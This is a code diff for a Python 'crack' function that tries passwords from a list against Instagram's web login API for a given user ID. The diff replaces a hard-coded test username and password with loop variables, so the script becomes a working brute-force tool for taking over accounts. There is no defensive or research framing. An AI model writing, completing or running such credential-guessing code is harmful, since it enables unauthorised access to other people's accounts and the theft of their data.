@@ -107,7 +107,7 @@ def crack(uid, password_list, total_count):
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{'767999'}"
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             cookies = {
             'csrftoken': csrftoken,
             'datr': 'SehHaXwOCk9GiWPH3fNZWglz',
@@ -147,7 +147,7 @@ def crack(uid, password_list, total_count):
             'optIntoOneTap': 'false',
             'queryParams': '{"flo":"true"}',
             'trustedDeviceRecords': '{}',
-            'username': '7679993170',
+            'username': uid,
             'jazoest': '22898',}
             # Make API request
             response = session.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
